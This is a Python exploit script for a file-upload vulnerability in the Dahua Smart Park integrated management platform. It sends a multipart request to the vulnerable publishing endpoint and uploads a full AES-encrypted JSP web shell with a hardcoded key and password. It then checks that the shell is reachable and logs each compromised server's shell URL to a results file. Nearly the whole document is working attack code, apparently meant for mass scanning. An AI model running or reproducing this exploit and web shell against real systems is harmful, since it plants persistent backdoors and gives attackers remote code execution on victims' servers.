import requests
import time
import json
import buter


poc = '/publishing/publishing/material/file/video'

filename = "./reps/大华智慧园区综合管理平台文件上传-"+str(time.strftime("%Y-%m-%d", time.localtime()))
headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
    'Content-Type': 'multipart/form-data; boundary=dd8f988919484abab3816881c55272a7'
}

#测试
data = '--dd8f988919484abab3816881c55272a7\r\nContent-Disposition: form-data; name="Filedata"; filename="0EaE10E7dF5F10C2.jsp"\r\n\r\n123\r\n--dd8f988919484abab3816881c55272a7--'
#gsl
gsl_data = '''--dd8f988919484abab3816881c55272a7\r\nContent-Disposition: form-data; name="Filedata"; filename="0EaE10E7dF5F10C2.jsp"\r\n\r\n<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}
%>\r\n--dd8f988919484abab3816881c55272a7--'''

def dhspcmpfileup(url):

    try:
        reps = requests.post(url=url + poc, headers=headers, data=gsl_data, verify=False, timeout=3)
        js = json.loads(reps.text)
        shell_path = url + "/publishingImg/" + js['data']['path']
        rep_shell = requests.get(url=shell_path)
        if rep_shell.status_code == 200:
            print(buter.colors.GREEN + f"存在大华智慧园区综合管理平台文件上传 shell_path: {shell_path} 默认shell_gsl_pass_key_connect " + buter.colors.END)
            f = open(filename,"a+",encoding="utf-8")
            f.write(shell_path)
            f.write("\n")
            f.close()
        else:
            print(buter.colors.RED + f"可能存在waf : {url}")
    except Exception as e:
        print(buter.colors.RED+ f"ERROR : {e}" + buter.colors.END)